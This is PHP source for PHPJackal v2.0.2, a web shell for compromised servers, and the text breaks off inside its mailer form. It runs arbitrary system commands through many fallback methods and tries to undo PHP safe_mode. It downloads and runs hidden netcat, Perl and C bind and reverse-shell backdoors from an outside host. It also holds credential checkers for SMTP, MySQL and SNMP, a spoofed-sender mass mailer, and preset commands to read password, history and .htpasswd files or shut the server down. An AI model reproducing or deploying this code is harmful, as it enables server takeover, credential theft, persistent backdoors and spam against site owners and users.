<?php
#PHPJackal v2.0.2
#http://h.ackerz.com
#--Config--#
$login_password='';#Login password
$email='';#Just in case you forget the password
$IP=array();#Allowed addresses [$IP=array('192.168.100.5','192.168.100.9');]
#----------#
error_reporting(0);
ignore_user_abort(true);
set_time_limit(0);
ini_set('max_execution_time','0');
ini_set('memory_limit','9999M');
ini_set('output_buffering',0);
set_magic_quotes_runtime(0);
if(!isset($_SERVER))$_SERVER=&$HTTP_SERVER_VARS;
if(!isset($_POST))$_POST=&$HTTP_POST_VARS;
if(!isset($_GET))$_GET=&$HTTP_GET_VARS;
if(!isset($_COOKIE))$_COOKIE=&$HTTP_COOKIE_VARS;
if(!isset($_FILES))$_FILES=&$HTTP_POST_FILES;
$_REQUEST = array_merge($_GET,$_POST);
if(get_magic_quotes_gpc()){
foreach($_REQUEST as $key=>$value)$_REQUEST[$key]=stripslashes($value);
}
if(count($IP) && !in_array($_SERVER['REMOTE_ADDR'],$IP))die('Access denied!');
function hlinK($str=''){
$myvars=array('attacH','forgeT','serveR','domaiN','modE','chkveR','chmoD','workingdiR','urL','cracK','imagE','namE','filE','downloaD','seC','cP','mV','rN','deL');
$ret=$_SERVER['PHP_SELF'].'?';
$new=explode('&',$str);
foreach($_GET as $key => $v){
$add=1;
foreach($new as $m){
$el=explode('=',$m);
if($el[0]==$key)$add=0;
}
if($add){if(!in_array($key,$myvars))$ret.="$key=$v&";}
}
$ret.=$str;
return $ret;
}
header('Cache-Control: no-cache, must-revalidate');
header('Expires: Mon, 7 Aug 1987 05:00:00 GMT');
if(!empty($_REQUEST['forgeT'])){
mail($email,'PHPJackal Password','Your password on '.$_SERVER['HTTP_HOST'].' is "'.$login_password.'"');
die("<h1>Mail sent</h1>");
}
if(!empty($login_password)){
if(!empty($_REQUEST['fpassw'])){
if($_REQUEST['fpassw']==$login_password)setcookie('passw',md5($_REQUEST['fpassw']));
header('Location: '.hlinK());
}
if(empty($_COOKIE['passw']) || $_COOKIE['passw']!=md5($login_password)){
	$forget='';
	if(!empty($email))$forget='<a href="'.hlinK("forgeT=1").'">Forget password!</a>';
	die('<html><body><form method="POST">Password:<input type="password" name="fpassw"><input type="submit" value="Login"></form><br />'.$forget.'</body></html>');
}
}
if (!empty($_REQUEST['slfrmv'])){unlink(__FILE__);die("<h1>Bye</h1>");}
if(!empty($_REQUEST['workingdiR']))chdir($_REQUEST['workingdiR']);
if(empty($_REQUEST['seC']))$_REQUEST['seC']='about';
$disablefunctions=ini_get('disable_functions');
$disablefunctions=explode(',',$disablefunctions);
function checkthisporT($ip,$port,$timeout,$type=0){
if(!$type){
$scan=fsockopen($ip,$port,$n,$s,$timeout);
if($scan){fclose($scan);return 1;}
}
elseif(function_exists('socket_set_timeout')){
$scan=fsockopen("udp://$ip",$port);
if($scan){
socket_set_timeout($scan,$timeout);
fwrite($scan,"\x00");
$s=time();
fread($scan,1);
if((time()-$s)>=$timeout){fclose($scan);return 1;}
}
}
return 0;
}
if(!function_exists('is_executable')){
function is_executable($addr){
return 0;
}
}
if(!function_exists('file_get_contents')){
function file_get_contents($addr){
$a=fopen($addr,'r');
$tmp=fread($a,filesize($a));
fclose($a);
if($a)return $tmp;else return null;
}
}
if(!function_exists('file_put_contents')){
function file_put_contents($addr,$con){
$a=fopen($addr,'w');
if(!$a)return 0;
$t=fwrite($a,$con);
fclose($a);
if($t)return strlen($con);
return 0;
}
}
function file_add_contentS($addr,$con){
$a=fopen($addr,'a');
if(!$a)return 0;
fwrite($a,$con);
fclose($a);
return strlen($con);
}
if(!empty($_REQUEST['chmoD']) && !empty($_REQUEST['modE']))chmod($_REQUEST['chmoD'],'0'.$_REQUEST['modE']);
if(!empty($_REQUEST['downloaD'])){
@ob_clean();
$dl=$_REQUEST['downloaD'];
$con=file_get_contents($dl);
header('Content-type: '.get_mimE($dl));
header("Content-disposition: attachment; filename=\"$dl\";");
header('Content-length: '.strlen($con));
die($con);
}
if(!empty($_REQUEST['imagE'])){
$img=$_REQUEST['imagE'];
header('Content-type: image/gif');
header("Content-length: ".filesize($img));
header("Last-Modified: ".date('r',filemtime($img)));
die(file_get_contents($img));
}
if(!empty($_REQUEST['exT'])){
$ex=$_REQUEST['exT'];
$e=get_extension_funcs($ex);
echo '<html><head><title>'.htmlspecialchars($ex).'</title></head><body><b>Functions:</b><br>';foreach($e as $k=>$f){$i=$k+1;echo "$i)$f ";if(in_array($f,$disablefunctions))echo '<font color=red>DISABLED</font>';echo '<br>';}
die('</body></html>');
}
function showsizE($size){
if($size>=1073741824)$size=round(($size/1073741824),2).' GB';
elseif($size>=1048576)$size=round(($size/1048576),2).' MB';
elseif($size>=1024)$size=round(($size/1024),2).' KB';
else $size.=' B';
return $size;
}
$windows=(substr((strtoupper(php_uname())),0,3)=='WIN')?1:0;
$cwd=getcwd();
$VERSION='2.0.2';
$intro='<img src="http://h.ackerz.com/PHPJackal/images/about.png" style="border: none; margin: 0;" /><br /><br />
<font color="red">
<pre>
______ _   _ ______  ___            _         _ 
| ___ \ | | || ___ \|_  |          | |       | |
| |_/ / |_| || |_/ /  | | __ _  ___| | ____ _| |
|  __/|  _  ||  __/   | |/ _` |/ __| |/ / _` | |
| |   | | | || |  /\__/ / (_| | (__|   < (_| | |
\_|   \_| |_/\_|  \____/ \__,_|\___|_|\_\__,_|_|
</pre></font><br />Version: '.$VERSION.'<br />Author: Nima Ghotbi (NetJackal)<br />Website: <a href="http://h.ackerz.com" target="_blank">http://h.ackerz.com</a><br /><br />You can submit Bugs/Ideas/Question at <a href="http://h.ackerz.com/forums/" target="_blank">http://h.ackerz.com/forums/</a><br />
<br />New in this version: <br />
<ul>
<li>Steganographer added.</li>
<li>MySQL dump added.</li>
<li>Mailer now support dynamic content and attachment.</li>
<li>Now you can set an email address to recover password in case you forget it later.</li>
<li>Editor improved.</li>
<li>Crackers improved.</li>
<li>Information section improved.</li>
<li>Header grabber improved.</li>
<li>Send by mail added to Filemanager.</li>
<li>Bug fix in Filemanager section.</li>
<li>...</li>
</ul>';
$hcwd="<input type=hidden name=workingdiR value='$cwd'>";
function checkfunctioN($func){
global $disablefunctions,$safemode;
$safe=array('passthru','system','exec','shell_exec','popen','proc_open');
if($safemode=='ON' && in_array($func,$safe))return 0;
elseif(function_exists($func) && is_callable($func) && !in_array($func,$disablefunctions))return 1;
return 0;
}
function is_eveN($num){
return ($num%2==0);
}
function asc2biN($char){
return str_pad(decbin(ord($char)), 8, "0", STR_PAD_LEFT);
}
function rgb2biN($rgb){
$binstream = "";
$red = ($rgb >> 16) & 0xFF;
$green = ($rgb >> 8) & 0xFF;
$blue = $rgb & 0xFF;
if(is_eveN($red))$binstream .= "1";else $binstream .= "0";
if(is_eveN($green))$binstream .= "1";else $binstream .= "0";
if(is_eveN($blue))$binstream .= "1";else $binstream .= "0";
return $binstream;
}
function stegfilE($image, $fileaddr,$out){
$filename=basename($fileaddr);
$path=dirname($fileaddr);
$imagename=basename($image);
$binstream = $recordstream = "";
$make_odd = Array();
$pic = ImageCreateFromJPEG($image);
$attributes = getImageSize($image);
$outpic = ImageCreateFromJPEG($image);
$data = file_get_contents($fileaddr);
do{
$boundary = chr(rand(0,255)).chr(rand(0,255)).chr(rand(0,255));
} while(strpos($data,$boundary)!==false && strpos($hidefile['name'],$boundary)!==false);
$data = $boundary.$filename.$boundary.$data.$boundary;
if(strlen($data)*8 > ($attributes[0]*$attributes[1])*3){
return "Cannot fit $filename in $imagename.<br />$imagename requires mask to contain at least ".(intval((strlen($data)*8)/3)+1)." pixels.<br />Maximum filesize that $imagename can hide is ".intval((($attributes[0]*$attributes[1])*3)/8)." bytes";
}
for($i=0; $i<strlen($data) ; $i++)
{
$char = $data{$i};
$binary = asc2biN($char);
$binstream .= $binary;

for($j=0 ; $j<strlen($binary) ; $j++)
{
$binpart = $binary{$j};
if($binpart=="0")
{
$make_odd[] = true;
} else {
$make_odd[] = false;
}
}
}
$y=0;
for($i=0,$x=0; $i<sizeof($make_odd) ; $i+=3,$x++){
$rgb = ImageColorAt($pic, $x,$y);
$cols = Array();
$cols[] = ($rgb >> 16) & 0xFF;
$cols[] = ($rgb >> 8) & 0xFF;
$cols[] = $rgb & 0xFF;

for($j=0 ; $j<sizeof($cols) ; $j++)
{
if($make_odd[$i+$j]===true && is_eveN($cols[$j])){
$cols[$j]++;
} else if($make_odd[$i+$j]===false && !is_eveN($cols[$j])){
$cols[$j]--;
}
}
$temp_col = ImageColorAllocate($outpic,$cols[0],$cols[1],$cols[2]);
ImageSetPixel($outpic,$x,$y,$temp_col);
if($x==($attributes[0]-1)){
$y++;
$x=-1;
}
}
ImagePNG($outpic,$out);
return '<b>Well done!</b> <a href="'.hlink("seC=img&filE=$out&workingdiR=$path").'">'.htmlspecialchars($out).'</a><br />';
}
function steg_recoveR($fileaddr){
global $cwd;
$ascii=$boundary=$binstream=$filename="";
$attributes = getImageSize($fileaddr);
$pic = ImageCreateFromPNG($fileaddr);
if(!$pic || !$attributes){
return "could not read image";
}
$bin_boundary = "";
for($x=0 ; $x<8 ; $x++)
{
$bin_boundary .= rgb2biN(ImageColorAt($pic, $x,0));
}
for($i=0 ; $i<strlen($bin_boundary) ; $i+=8)
{
$binchunk = substr($bin_boundary,$i,8);
$boundary .= chr(bindec($binchunk));
}
$start_x = 8;
for($y=0 ; $y<$attributes[1] ; $y++)
{
for($x=$start_x ; $x<$attributes[0] ; $x++){
$binstream .= rgb2biN(ImageColorAt($pic, $x,$y));
if(strlen($binstream)>=8){
$binchar = substr($binstream,0,8);
$ascii .= chr(bindec($binchar));
$binstream = substr($binstream,8);
}
if(strpos($ascii,$boundary)!==false){
$ascii = substr($ascii,0,strlen($ascii)-3);
if(empty($filename)){
$filename = $ascii;
$ascii = "";
} else {
break 2;
}
}
}
$start_x = 0;
}
file_put_contents($filename,$ascii);
return '<b>Well done!</b> <a href="'.hlink("seC=openit&namE=$filename&workingdiR=$cwd").'">'.htmlspecialchars($filename).'</a><br />';
}
function whereistmP(){
$uploadtmp=ini_get('upload_tmp_dir');
$uf=getenv('USERPROFILE');
$af=getenv('ALLUSERSPROFILE');
$se=ini_get('session.save_path');
$envtmp=(getenv('TMP'))?getenv('TMP'):getenv('TEMP');
if(is_dir('/tmp') && is_writable('/tmp'))return '/tmp';
if(is_dir('/usr/tmp') && is_writable('/usr/tmp'))return '/usr/tmp';
if(is_dir('/var/tmp') && is_writable('/var/tmp'))return '/var/tmp';
if(is_dir($uf) && is_writable($uf))return $uf;
if(is_dir($af) && is_writable($af))return $af;
if(is_dir($se) && is_writable($se))return $se;
if(is_dir($uploadtmp) && is_writable($uploadtmp))return $uploadtmp;
if(is_dir($envtmp) && is_writable($envtmp))return $envtmp;
return '.';
}
function shelL($command){
global $windows;
$exec=$output='';
$dep[]=array('pipe','r');$dep[]=array('pipe','w');
if(checkfunctioN('passthru')){ob_start();passthru($command);$exec=ob_get_contents();ob_clean();ob_end_clean();}
elseif(checkfunctioN('system')){$tmp=ob_get_contents();ob_clean();system($command);$output=ob_get_contents();ob_clean();$exec=$tmp;}
elseif(checkfunctioN('exec')){exec($command,$output);$output=join("\n",$output);$exec=$output;}
elseif(checkfunctioN('shell_exec'))$exec=shell_exec($command);
elseif(checkfunctioN('popen')){$output=popen($command,'r');while(!feof($output)){$exec=fgets($output);}pclose($output);}
elseif(checkfunctioN('proc_open')){$res=proc_open($command,$dep,$pipes);while(!feof($pipes[1])){$line=fgets($pipes[1]);$output.=$line;}$exec=$output;proc_close($res);}
elseif(checkfunctioN('win_shell_execute'))$exec=winshelL($command);
elseif(checkfunctioN('win32_create_service'))$exec=srvshelL($command);
elseif(extension_loaded('ffi') && $windows)$exec=ffishelL($command);
elseif(is_object($ws=new COM('WScript.Shell')))$exec=comshelL($command,$ws);
elseif(extension_loaded('perl'))$exec=perlshelL($command);
return $exec;
}
function getiT($get){
$fo=strtolower(ini_get('allow_url_fopen'));
$ui=strtolower(ini_get('allow_url_include'));
if($fo || $fo=='on')$con=file_get_contents($get);
elseif($ui || $ui=='on'){
ob_start();
include($get);
$con=ob_get_contents();
ob_end_clean();
}
else{
$u=parse_url($get);
$host=$u['host'];$file=(empty($u['path']))?'/':$u['path'];$port=(empty($u['port']))?80:$u['port'];
$url=fsockopen($host,$port,$en,$es,12);
fputs($url,"GET $file HTTP/1.0\r\nAccept-Encoding: text\r\nHost: $host\r\nReferer: $host\r\nUser-Agent: Mozilla/5.0 (compatible; Konqueror/3.1; FreeBSD)\r\n\r\n");
$tmp=$con='';
while($tmp!="\r\n")$tmp=fgets($url);
while(!feof($url))$con.=fgets($url);
}
return $con;
}
function downloadiT($get,$put){
$con=getiT($get);
$mk=file_put_contents($put,$con);
if($mk)return 1;
return 0;
}
function winshelL($command){
$name=whereistmP()."\\".uniqid('NJ');
win_shell_execute('cmd.exe','',"/C $command >\"$name\"");
sleep(1);
$exec=file_get_contents($name);
unlink($name);
return $exec;
}
function ffishelL($command){
$name=whereistmP()."\\".uniqid('NJ');
$api=new ffi("[lib='kernel32.dll'] int WinExec(char *APP,int SW);");
$res=$api->WinExec("cmd.exe /c $command >\"$name\"",0);
while(!file_exists($name))sleep(1);
$exec=file_get_contents($name);
unlink($name);
return $exec;
}
function srvshelL($command){
$name=whereistmP()."\\".uniqid('NJ');
$n=uniqid('NJ');
$cmd=(empty($_SERVER['ComSpec']))?'d:\\windows\\system32\\cmd.exe':$_SERVER['ComSpec'];
win32_create_service(array('service'=>$n,'display'=>$n,'path'=>$cmd,'params'=>"/c $command >\"$name\""));
win32_start_service($n);
win32_stop_service($n);
win32_delete_service($n);
while(!file_exists($name))sleep(1);
$exec=file_get_contents($name);
unlink($name);
return $exec;
}
function get_mimE($filename){ 
global $windows;
preg_match("/\.(.*?)$/", $filename, $m);
switch(strtolower($m[1])){ 
case "js": return "application/javascript"; 
case "json": return "application/json"; 
case "jpg": case "jpeg": case "jpe": return "image/jpg"; 
case "png": case "gif": case "bmp": return "image/".strtolower($m[1]); 
case "css": return "text/css"; 
case "xml": return "application/xml"; 
case "html": case "htm": case "php": return "text/html"; 
default: 
if(function_exists("mime_content_type")){$m = mime_content_type($filename);}elseif(function_exists("finfo_open")){
$finfo = finfo_open(FILEINFO_MIME); 
$m = finfo_file($finfo, $filename); 
finfo_close($finfo); 
}else{
if($windows)return "application/octet-stream";
if(strstr($_SERVER[HTTP_USER_AGENT], "Macintosh")){$m = trim(shelL('file -b --mime '.$filename)); 
}else{
$m = trim(shelL('file -bi '.$filename)); 
} 
} 
$m = split(";", $m); 
return trim($m[0]); 
} 
}
function comshelL($command,$ws){
$exec=$ws->exec("cmd.exe /c $command"); 
$so=$exec->StdOut();
return $so->ReadAll();
}
function perlshelL($command){
$perl=new perl();
ob_start();
$perl->eval("system('$command')");
$exec=ob_get_contents();
ob_end_clean();
return $exec;
}
function smtpchecK($addr,$user,$pass,$timeout){
$sock=fsockopen($addr,25,$n,$s,$timeout);
if(!$sock)return -1;
fread($sock,1024);
fputs($sock,'ehlo '.uniqid('NJ')."\r\n");
$res=substr(fgets($sock,512),0,1);
if($res!='2')return 0;
fgets($sock,512);fgets($sock,512);fgets($sock,512);
fputs($sock,"AUTH LOGIN\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='334')return 0;
fputs($sock,base64_encode($user)."\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='334')return 0;
fputs($sock,base64_encode($pass)."\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='235')return 0;
return 1;
}
function mysqlchecK($host,$user,$pass,$timeout){
if(function_exists('mysql_connect')){
$l=mysql_connect($host,$user,$pass);
if($l)return 1;
}
return 0;
}
function mssqlchecK($host,$user,$pass,$timeout){
if(function_exists('mssql_connect')){
$l=mssql_connect($host,$user,$pass);
if($l)return 1;
}
return 0;
}
function checksmtP($host,$timeout){
$from=strtolower(uniqid('nj')).'@'.strtolower(uniqid('nj')).'.com';
$sock=fsockopen($host,25,$n,$s,$timeout);
if(!$sock)return -1;
$res=substr(fgets($sock,512),0,3);
if($res!='220')return 0;
fputs($sock,'HELO '.uniqid('NJ')."\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='250')return 0;
fputs($sock,"MAIL FROM: <$from>\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='250')return 0;
fputs($sock,"RCPT TO: <contact@persianblog.ir>\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='250')return 0;
fputs($sock,"DATA\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='354')return 0;
fputs($sock,"From: ".uniqid('NJ')." ".uniqid('NJ')." <$from>\r\nSubject: ".uniqid('NJ')."\r\nMIME-Version: 1.0\r\nContent-Type: text/plain;\r\n\r\n".uniqid('Hello ',true)."\r\n.\r\n");
$res=substr(fgets($sock,512),0,3);
if($res!='250')return 0;
return 1;
}
function replace_stR($s,$h){
$ret=$h;
foreach($s as $k=>$r)$ret=str_replace($k,$r,$ret);
return $ret;
}
function check_urL($url,$method,$search='200',$timeout=3){
$u=parse_url($url);
$method=strtoupper($method);
$host=$u['host'];$file=(!empty($u['path']))?$u['path']:'/';$port=(empty($u['port']))?80:$u['port'];
$data=(!empty($u['query']))?$u['query']:'';
if(!empty($data))$data="?$data";
$sock=fsockopen($host,$port,$en,$es,$timeout);
if($sock){
fputs($sock,"$method $file$data HTTP/1.0\r\n");
fputs($sock,"Host: $host\r\n");
if($method=='GET')fputs($sock,"\r\n");
elseif($method=='POST')fputs($sock,'Content-Type: application/x-www-form-urlencoded\r\nContent-length: '.strlen($data)."\r\nAccept-Encoding: text\r\nConnection: close\r\n\r\n$data");
else return 0;
if($search=='200')if(strstr(fgets($sock),'200')){fclose($sock);return 1;}else{fclose($sock);return 0;}
while(!feof($sock)){
$res=fgets($sock);
if(!empty($res))if(strstr($res,$search)){fclose($sock);return 1;}
}
fclose($sock);
}
return 0;
}
function get_sw_namE($host,$timeout){
$sock=fsockopen($host,80,$en,$es,$timeout);
if($sock){
$page=uniqid('NJ');
fputs($sock,"GET /$page HTTP/1.0\r\n\r\n");
while(!feof($sock)){
$con=fgets($sock);
if(strstr($con,'Server:')){$ser=substr($con,strpos($con,' ')+1);return $ser;}
}
fclose($sock);
return -1;
}return 0;
}
function snmpchecK($ip,$com,$timeout){
$res=0;
$n=chr(0x00);
$packet=chr(0x30).chr(0x26).chr(0x02).chr(0x01).chr(0x00).chr(0x04).chr(strlen($com)).$com.chr(0xA0).chr(0x19).chr(0x02).chr(0x01).chr(0x01).chr(0x02).chr(0x01).$n.chr(0x02).chr(0x01).$n.chr(0x30).chr(0x0E).chr(0x30).chr(0x0C).chr(0x06).chr(0x08).chr(0x2B).chr(0x06).chr(0x01).chr(0x02).chr(0x01).chr(0x01).chr(0x01).$n.chr(0x05).$n;
$sock=fsockopen("udp://$ip",161);
if(function_exists('socket_set_timeout'))socket_set_timeout($sock,$timeout);
fputs($sock,$packet);
socket_set_timeout($sock,$timeout);
$res=fgets($sock);
fclose($sock);
if($res != '')return 1;else return 0;
}
$safemode=(ini_get('safe_mode') || strtolower(ini_get('safe_mode'))=='on')?'ON':'OFF';
if($safemode=='ON'){ini_restore('safe_mode');ini_restore('open_basedir');}
function brshelL(){
global $windows,$hcwd;
echo '<img src="http://h.ackerz.com/PHPJackal/images/br.png" style="border: none; margin: 0;" /><br /><br />';
$_REQUEST['C']=(isset($_REQUEST['C']))?$_REQUEST['C']:0;
$addr='http://h.ackerz.com/PHPJackal/br';
$error="Can not make backdoor file, go to writeable folder.";
$n=uniqid('NJ_');
if(!$windows)$n=".$n";
$d=whereistmP();
$name=$d.DIRECTORY_SEPARATOR.$n;
$c=($_REQUEST['C'])?1:0;
if(!empty($_REQUEST['port']) && ($_REQUEST['port']<=65535) && ($_REQUEST['port']>=1)){
$port=(int)$_REQUEST['port'];
if($windows){
if($c){
$name.='.exe';
$bd=downloadiT("$addr/nc",$name);
shelL("attrib +H $name");
if(!$bd)echo $error;else shelL("$name -L -p $port -e cmd.exe");
}else{
$name=$name.'.pl';
$bd=downloadiT("$addr/winbind.p",$name);
shelL("attrib +H $name");
if(!$bd)echo $error;else shelL("perl $name $port");
}
}
else{
if($c){
$bd=downloadiT("$addr/bind.c",$name);
if(!$bd)echo $error;else shelL("cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $port &");
}else{
$bd=downloadiT("$addr/bind.p",$name);
if(!$bd)echo $error;else shelL("cd $d;perl $n $port &");
echo "<font color=blue>Backdoor is waiting for you on $port.<br></font>";
}
}
}
elseif(!empty($_REQUEST['rport']) && ($_REQUEST['rport']<=65535) && ($_REQUEST['rport']>=1) && !empty($_REQUEST['ip'])){
$ip=$_REQUEST['ip'];
$port=(int)$_REQUEST['rport'];
if($windows){
if($c){
$name.='.exe';
$bd=downloadiT("$addr/nc",$name);
shelL("attrib +H $name");
if(!$bd)echo $error;else shelL("$name $ip $port -e cmd.exe");
}else{
$name=$name.'.pl';
$bd=downloadiT("$addr/winrc.p",$name);
shelL("attrib +H $name");
if (!$bd)echo $error;else shelL("perl.exe $name $ip $port");
}
}
else{
if($c){
$bd=downloadiT("$addr/rc.c",$name);
if(!$bd)echo $error;else shelL("cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $ip $port &");
}else{
$bd=downloadiT("$addr/rc.p",$name);
if(!$bd)echo $error;else shelL("cd $d;perl $n $ip $port &");
}
}
echo '<font color=blue>Done!</font>';}
else{
echo '<form name=bind method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Bind shell</label></div><div class="fieldwrapper"><label class="styled">Port:</label><div class="thefield"><input type="text" name="port" value="55501" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Type:</label><div class="thefield"><ul style="margin-top:0;"><li><input type="radio" value="0" checked name="C" /> <label>PERL</label></li><li><input type="radio" name="C" value="1" /> <label>';if($windows)echo 'EXE';else echo 'C';echo '</label></li></ul></div></div>'.$hcwd.'<div class="buttonsdiv"><input type="submit" value="Bind" style="margin-left: 150px;" /></div></form><form name=reverse method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Reverse shell</label></div><div class="fieldwrapper"><label class="styled">IP:</label><div class="thefield"><input type="text" name="ip" value="';echo $_SERVER['REMOTE_ADDR'];echo '" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Port:</label><div class="thefield"><input type="text" name="rport" value="53" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Type:</label><div class="thefield"><ul style="margin-top:0;"><li><input type="radio" value="0" checked name="C" /> <label>PERL</label></li><li><input type="radio" name="C" value="1" /> <label>';if($windows)echo 'EXE';else echo 'C';echo '</label></li></ul></div></div>'.$hcwd.'<div class="buttonsdiv"><input type="submit" value="Connect" style="margin-left: 150px;" /></div></form>';
}
}
function showimagE($img){
echo '<img border=0 src="'.hlinK("imagE=$img&&workingdiR=".getcwd()).'"><br /><a href="javascript: history.go(-1)"><img src="http://h.ackerz.com/PHPJackal/images/back.png" /><b>Back</b></a>';}
function editoR($file=''){
global $hcwd,$cwd;
if(!empty($_REQUEST['filE']))$file=$_REQUEST['filE'];
if($file=='')$file=$cwd;else $file=realpath($file);
$data="";
if(is_file($file)){
if(!is_readable($file)){echo "File is not readable";}
if(!is_writeable($file)){echo "File is not writeable";}
$data=file_get_contents($file);
}
echo '<img src="http://h.ackerz.com/PHPJackal/images/editor.png" style="border: none; margin: 0;" /><br /><br /><form method="POST" class="form"><div class="fieldwrapper"><label class="styled">File:</label><div class="thefield"><input type="text" name="filE" value="'.htmlspecialchars($file).'" size="30" />'.$hcwd.'</div></div><div class="buttonsdiv"><input type="submit" name="open" value="Open" style="margin-left: 150px;" /></div></form><form method="POST" class="form"><div class="fieldwrapper"><label class="styled">Content:</label><div class="thefield"><textarea name="edited">'.htmlspecialchars($data).'</textarea></div></div>'.$hcwd.'<input type="hidden" name="filE" value="'.htmlspecialchars($file).'"/><div class="buttonsdiv"><input type="submit" name="Save" value="Save" style="margin-left: 150px;" /></div></form>';
}
function webshelL(){
global $windows,$hcwd,$cwd;
if($windows){
$alias="<option value='netstat -an'>Display open ports</option><option value='tasklist'>List of processes</option><option value='systeminfo'>System information</option><option value='ipconfig /all'>IP configuration</option><option value='getmac'>Get MAC address</option><option value='net start'>Services list</option><option value='net view'>Machines in domain</option><option value='net user'>Users list</option><option value='shutdown -s -f -t 1'>Turn off the server</option>";
}
else{
$alias="<option value='netstat -an | grep -i listen'>Display open ports</option><option value='last -a -n 250 -i'>Show last 250 logged in users</option><option value='which wget curl lynx w3m'>Downloaders</option><option value='find / -perm -2 -type d -print'>Find world-writable directories</option><option value='find . -perm -2 -type d -print'>Find world-writable directories(in current directory)</option><option value='find / -perm -2 -type f -print'>Find world-writable files</option><option value='find . -perm -2 -type f -print'>Find world-writable files(in current directory)</option><option value='find / -type f -perm 04000 -ls'>Find files with SUID bit set</option><option value='find / -type f -perm 02000 -ls'>Find files with SGID bit set</option><option value='find / -name .htpasswd -type f'>Find .htpasswd files</option><option value='find / -type f -name .bash_history'>Find .bash_history files</option><option value='cat /etc/syslog.conf'>View syslog.conf</option><option value='cat cat /etc/hosts'>View hosts</option><option value='ps auxw'>List of processes</option>";
if(is_dir('/etc/valiases'))$alias.="<option value='ls -l /etc/valiases'>List of cPanel`s domains(valiases)</option>";if(is_dir('/etc/vdomainaliases'))$alias.="<option value='ls -l /etc/vdomainaliases'>List cPanel`s domains(vdomainaliases)</option>";if(file_exists('/var/cpanel/accounting.log'))$alias.="<option value='cat /var/cpanel/accounting.log'>Display cPanel`s log</option>";
if(is_dir('/var/spool/mail/'))$alias.="<option value='ls /var/spool/mail/'>Mailboxes list</option>";
}
echo '<img src="http://h.ackerz.com/PHPJackal/images/webshell.png" style="border: none; margin: 0;" /><br /><br /><form method="POST" class="form"><form method="POST" class="form"><div class="fieldwrapper"><label class="styled">Location:</label><div class="thefield"><input type="text" name="workingdiR" value="'.$cwd.'" size="30" /><br /></div></div><div class="buttonsdiv"><input type="submit" value="Change" style="margin-left: 150px;" /></div></form><form method="POST" class="form">';
if(!empty($_REQUEST['cmd'])){
echo '<div class="fieldwrapper"><label class="styled">Result:</label><div class="thefield"><pre>';echo shelL($_REQUEST['cmd']);echo'</pre></div></div>';
}
echo '<div class="fieldwrapper"><label class="styled">Command:</label><div class="thefield"><input type="text" name="cmd" value="';if(!empty($_REQUEST['cmd']))echo htmlspecialchars(($_REQUEST['cmd']));elseif(!$windows)echo "cat /etc/passwd";echo '" size="30" /><br /></div></div>'.$hcwd.'<div class="buttonsdiv"><input type="submit" value="Execute" style="margin-left: 150px;" /></div></form><form method="POST" class="form"><div class="fieldwrapper"><label class="styled">Alias:</label><div class="thefield"><select name="cmd">'.$alias.'</select></div></div>'.$hcwd.'<div class="buttonsdiv"><input type="submit" value="Execute" style="margin-left: 150px;" /></div></form>';
}
function maileR(){
global $hcwd,$cwd;
echo '<img src="http://h.ackerz.com/PHPJackal/images/mail.png" style="border: none; margin: 0;" /><br /><br />';
if(!empty($_REQUEST['subject'])&&!empty($_REQUEST['body'])&&!empty($_REQUEST['from'])&&!empty($_REQUEST['to'])){
$from=$_REQUEST['from'];$subject=$_REQUEST['subject'];$body=$_REQUEST['body'];
$to= explode("\n",$_REQUEST['to']);
$headers="From: $from";
if(!empty($_REQUEST['attach'])){
if(is_readable($_REQUEST['attach'])){
$data=file_get_contents($_REQUEST['attach']);  
$mime_boundary = "----=".md5(time());; 
$headers .= "\nMIME-Version: 1.0\n".
"Content-Type: multipart/mixed; boundary=\"$mime_boundary\""; 
$data = chunk_split(base64_encode($data));
$type=get_mimE($_REQUEST['attach']);
$body =
"$mime_boundary\n".
"Content-Type: text/html; charset=\"iso-8859-1\"\n".
"Content-Transfer-Encoding: 7bit\n\n".
$body."\n".
"$mime_boundary\n".
"Content-Type: $type; name=\"".basename($_REQUEST['attach'])."\"\n".
"Content-Disposition: attachment; filename=\"".basename($_REQUEST['attach'])."\"\n".
"Content-Transfer-Encoding: Base64\n\n".
$data."\n".
"$mime_boundary--\n"; 
}
}
$_SERVER['PHP_SELF'] = "/";
$_SERVER['REMOTE_ADDR'] = '127.0.0.1';
$_SERVER['SERVER_NAME'] = 'google.com';
echo "<pre>";
foreach ($to as $target){
$info=explode('@',$target);
$rsubject=str_replace('[EMAIL]',$target,$subject);$rsubject=str_replace('[USER]',$info[0],$subject);$rsubject=str_replace('[DOMAIN]',$info[1],$subject);
$rbody=str_replace('[EMAIL]',$target,$body);
$rbody=str_replace('[USER]',$info[0],$rbody);
$rbody=str_replace('[DOMAIN]',$info[1],$rbody);
for($i=0;$i<(int)$_REQUEST['count'];$i++){
$target=trim($target);
if(mail($target,$rsubject,$rbody,$headers))echo "Email to ".htmlspecialchars($target). " sent!\r\n";else echo "Error: Can not send mail to ".htmlspecialchars($target)."!\r\n";
}
}
echo "</pre><br />";
}else{
echo '<form name=client method="POST"><div class="fieldwrapper"><label class="styled" style="width:320px">Mail sender</label></div><div class="fieldwrapper"><label class="styled">SMTP:</label><div class="thefield">'.ini_get('SMTP').':'.ini_get('smtp_port').'</div></div><div class="fieldwrapper"><label class="styled">From:</label><div class="thefield"><input type="text" name="from" value="evil@hell.gov" size="30" /></div></div><div class="fieldwrapper"><label class="styled">To:</label><div class="thefield"><textarea name="to">';if(!empty($_ENV['SERVER_ADMIN']))echo $_ENV['SERVER_ADMIN'];else echo 'admin@'.getenv('HTTP_HOST'); echo '</textarea></div></div><div class="fieldwrapper"><label class="styled">Subject:</label><div class="thefield"><input type="text" name="subject" size="30" /></div></div><div class="fieldwrapper"><label class="styled">Body:</label><div class="thefield"><textarea name="body">
For each address will be [USER], [DOMAIN] and [EMAIL] replaced in mail subject and body.

Ex. john@example.net
[USER] => john
[DOMAIN] => example.net
[EMAIL] => john@example.net

